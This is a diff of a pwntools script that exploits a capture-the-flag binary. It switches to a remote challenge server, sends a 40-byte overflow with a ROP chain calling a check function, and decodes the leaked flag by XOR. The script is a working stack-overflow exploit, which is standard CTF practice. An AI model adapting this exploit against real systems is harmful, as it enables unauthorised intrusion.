@@ -1,8 +1,8 @@
 from pwn import *
 from Crypto.Util.number import bytes_to_long, long_to_bytes
 
-r = process('./chal')
-# r = remote('10.113.184.121', 10051)
+# r = process('./chal')
+r = remote('10.113.184.121', 10051)
 context.arch = 'amd64'
 
 r.recvuntil(b'secret = ')
@@ -29,15 +29,14 @@ rop_chain = flat(
     pop_rdi_ret,        bss_section,
     check_fn_addr
 )
-raw_input()
+# raw_input()
 r.sendlineafter(b'> ', b'a' * 40 + rop_chain)
 r.recvuntil(b'flag = ')
 output = r.recvline().strip()
-tmp = bytes_to_long(b'kyoumokawaii')
 log.info(f'output = {output}')
 log.info(f'Part 1 = {hex(u64(output[0:8]))}, Part 2 = {hex(u64(output[8:16]))}')
-flag_1 = long_to_bytes(u64(output[0:8]) ^ input_1)
-flag_2 = long_to_bytes(u64(output[8:16]) ^ input_2)
-log.info(f'flag = {flag_1} + {flag_2}')#long_to_bytes(output ^ secret ^ tmp)
+flag_1 = p64(u64(output[0:8]) ^ input_1)
+flag_2 = p64(u64(output[8:16]) ^ input_2)
+log.info(f'flag = {(flag_1 + flag_2).strip().decode()}')
 
 r.interactive()
